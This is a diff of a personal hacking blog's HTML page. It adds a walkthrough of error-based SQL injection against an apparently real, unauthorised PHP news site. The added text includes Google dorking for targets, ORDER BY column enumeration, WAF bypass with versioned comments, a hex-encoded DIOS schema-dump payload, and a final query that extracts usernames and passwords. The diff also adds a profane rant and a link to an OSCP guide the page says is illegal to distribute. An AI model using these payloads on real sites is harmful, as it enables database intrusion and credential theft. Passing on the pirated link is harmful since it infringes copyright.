@@ -115,7 +115,7 @@
           <div class="mainTextPlain">HARDWARE:</div>
           <div class="mainTextPlain">SOFTWARE:</div> <a href="#NBDE">NBDE</a> /<a href="#WAF"> WAF</a>
           <div class="mainTextPlain">TOOLS:</div> <a href="#WIFI // Airgeddon">WIFI-Airgeddon </a>/ <a href="#encrypter">encrypter </a>/ <a href="#pswd">Linux pswd gen</a>/ <a href="#SSH MITM"> SSH MITM</a> /<a href="#SQLMap"> SQLMap</a>
-          <div class="mainTextAfter" >The page is still being developed. </div>
+          <div class="mainTextAfter" >The page is still being developed. <br> PS <br> For those who are interested to know if I play CTF.  No, I absolutely don't give a fuck about them. I hate the forced separation and consolidation of players with insufficient knowledge. The connotation is disgusting. I wish to burn in hell to the fuckers who ruined CTF and courses for beginners. (certainly, this does not apply to good olympiads and courses) </div>
           </details>
       </div>
     </div>
@@ -485,7 +485,7 @@ File system: A pool can contain one or more file systems formatted in XFS and us
 		<div class="mainBlogContainer">
 			<div class="greeting">
 				<div class="mainText"><span style="color: rgb(199, 0, 0)">Bypassing WAF to perform advanced SQL injection based on errors</span></div>
-				<div class="mainTextPlain">Let's "assume" that we stumbled upon a site, looking through which we did not see a single parameter, even though it is built in PHP. <br>Let's try using google dorking and using a simple dork inurl:http://domain.com then we will be able to get some interesting endpoints...</div>
+				<div class="mainTextPlain">"Assume" that we stumbled upon a site, looking through which we did not see a single parameter, even though it is built in PHP. <br>Let's try using google dorking and using a simple dork inurl:http://domain.com then we will be able to get some interesting endpoints...</div>
 				<details>
 					<summary><pre>
    _____
@@ -493,10 +493,73 @@ File system: A pool can contain one or more file systems formatted in XFS and us
   |  o. |
   |__O__|
 					 </pre></summary>
-					
+					<div class="mainTextPlain">one of the links leads to the point:</div>
+					<div class="textHolderAvarage">http://domain.com/REDACTED/news.php?id=13</div>
+					<div class="mainTextPlain">When opening the URL, I encountered a MySQL error. Even from the Google dork output you can see it:</div>
+					<div class="textHolderAvarage">Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean give in … on line 27</div>
+					<div class="mainTextPlain">The error is very valuable to us because we know that we can perform some logical queries. Let's start the operation.</div>
+					<div class="mainText"><span style="color: rgb(199, 0, 0);">Analysis of website behavior</span></div>
+					<div class="mainTextPlain">I tried a few basic queries to see how the site behaves. When entering an incorrect request, 2 errors are returned (1 which was by default and another which was caused by us). <br>So we know that if our query is correct, we only get 1 error message, otherwise we get 2 error messages. Thanks to this valuable information (which took me some time), let's get the number of columns using an ORDER BY query.</div>
+					<div class="mainText"><span style="color: rgb(199, 0, 0);">Finding the number of columns with Boolean + ORDER BY</span></div>
+					<div class="mainTextPlain">Since the server is waiting for a logical operator, I can use the AND 0 query, however, some other logical queries can be used:</div>
+					<div class="textHolderAvarage">AND null <br> AND 1</div>
+					<div class="mainTextPlain">Now let's add both a logical string and an ORDER BY query to our query. I always try to start by searching for a column with the number 1, because I am 100% sure that the site will not show any error.</div>
+					<div class="textHolderAvarage">http://domain.com/REDACTED/news.php?id=13 AND 0 order by 1-- -</div>
+					<div class="mainTextPlain">We only get 1 error message (from the website, not because of our request). Now that we know that our query is correct, let's try increasing the number of columns by 1 until we get the second error.</div>
+					<div class="textHolderAvarage">
+						?id=13 AND 0 order by 1-— - (shows 1 error) <br>
+						?id=13 AND 0 order by 2 — — (shows 1 error) <br>
+						?id=13 AND 0 order by 3-— — (shows 1 error) <br>
+						?id=13 AND 0 order by 4-— — (shows 1 error) <br>
+						?id=13 AND 0 order by 5-— — (shows 1 error) <br>
+						?id=13 AND 0 order by 6-— — (shows 2 errors)
+					</div>
+					<div class="mainTextHolder">The second error message appears when we try to find the 6th column. So this means that the database has only 5 columns.</div>
+					<div class="textHolderAvarage">?id=13 AND 0 order by 6-— —</div>
+					<div class="mainTextPlain">Before proceeding, let's make sure once again that there are 5 columns in the database.</div>
+					<div class="textHolderAvarage">?id=13 AND 0 order by 5-— —</div>
+					<div class="mainText"><span style="color: rgb(199, 0, 0);">Traversing the WAF and finding a column for the dump</span></div>
+					<div class="mainTextPlain">Now we are sure because we don't get the second error. It's time to find which of these 5 columns will allow us to get the data using the UNION SELECT query.</div>
+					<div class="textHolderAvarage">http://domain.com/REDACTED/news.php?id=13 AND 0 union select 1,2,3,4,5-- -</div>
+					<div class="mainTextPlain">However, our request was blocked by WAF, let's try to get around the ban. There are tons of UNION requests to bypass WAF, but in this case it worked:</div>
+					<div class="textHolderAvarage">http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5-- -</div>
+					<div class="mainTextPlain">We have bypassed the WAF, but the number is not displayed. Because of this, we don't know which columns we are going to reset. I looked through the whole page, but I didn't find anything, so I decided to look through the source code.<br>In one part we see the numbers 2 and 3. Great, now we know we have to focus on these 2 columns. In this case, I'll try the second column.</div>
+					<div class="mainText"><span style="color: rgb(199, 0, 0);">dump all data from the second column</span></div>
+					<div class="mainTextPlain">Using a UNION-based query, let's get the database name.</div>
+					<div class="textHolderAvarage">http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,database(),3,4,5-— -</div>
+					<div class="mainText"><span style="color: rgb(199, 0, 0);">Automatic dump of tables + columns using DIOS</span></div>
+					<div class="mainTextPlain">I will try to introduce a DIOS payload because getting each column for each table manually is very long and boring. The DIOS payload I used is specifically built to bypass WAF using 0xHEX conversion and /*!00000 to bypass strings</div>
+					<div class="textHolder"><pre>
+	http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/
+	1,/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636
+	f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6
+	e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203
+	c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657
+	273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),
+	0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c7468656164
+	e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e4
+	36f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/
+	*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(informati
+	on_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368
+	656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6
+	e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,
+	table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7
+	420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,
+	table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e742
+	0636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f
+	666f6e743e3c2f74643e3c2f74723e))))x)),3,4,5 -- -
+					</pre></div>
+					<div class="mainText"><span style="color: rgb(199, 0, 0);">Dump data inside columns</span></div>
+					<div class="mainTextPlain">That's what caught my attention. I will focus on the user table and dump data from 2 columns: username and password. The final payload will be as follows:</div>
+					<div class="textHolder">http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x3c62723e)+FROM+kbelb_db.user),3,4,5-- -</div>
+					<div class="mainText">Now we look at the source code and see the username and password of the administrator or user.</div>
 				</details>
 			</div>
 		</div>
+
+
+
+
 
 
 
@@ -562,6 +625,8 @@ _/      Y      \_
 				<div class="bookContainer"><p><img class="bookIMG" src="../literature/Dumay_kak_programmist_Kreativny_podkhod_k_sozdaniyu_koda_C_versia_2018_Sprol.png"></p><a href="https://drive.google.com/uc?export=download&id=1kzB9tPb5eGTQgzfFkh17XWXfZi4H6Ujv">RUS</a></div>
 				<div class="bookContainer"><p><img class="bookIMG" src="../literature/OReilly_NGINX_Cookbook.png"></p><a href="https://drive.google.com/uc?export=download&id=1krNtwwzho49orjYgPQsP7GnJXbxv8gug">ENG</a></div>
 				<div class="bookContainer"><p><img class="bookIMG" src="../literature/jackandtricks.png"></p><a href="https://drive.google.com/uc?export=download&id=1YYolLrRHO6JHWa11tdy_BJf6O1GU9mho">RUS</a></div>
+				<div class="bookContainer"><p><img class="bookIMG" src="../literature/OSCP.png"></p>complete guide (distribution is illegal) <a href="https://drive.google.com/uc?export=download&id=1OIXAS1h5QLjOPizAzALwhKsOjxdnTy7-">ENG</a></div>
+
 			</div>
 		</div>
 
